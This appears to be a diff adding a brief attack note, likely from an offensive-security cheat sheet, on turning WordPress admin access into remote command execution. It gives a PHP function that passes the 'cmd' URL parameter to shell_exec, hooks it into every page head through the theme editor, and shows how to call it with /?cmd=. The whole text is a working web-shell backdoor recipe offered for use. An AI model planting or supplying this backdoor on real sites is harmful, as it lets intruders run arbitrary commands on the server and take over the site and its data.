@@ -1,0 +1,11 @@
+With access to wordpress admin
+Go to appearience > editor > theme functions > add this code:
+
+function webshell(){
+	echo shell_exec($_GET['cmd']);
+}
+
+add_action('wp_head', 'webshell');
+
+
+Then you just can go to the main wp site and add a /?cmd=<command>
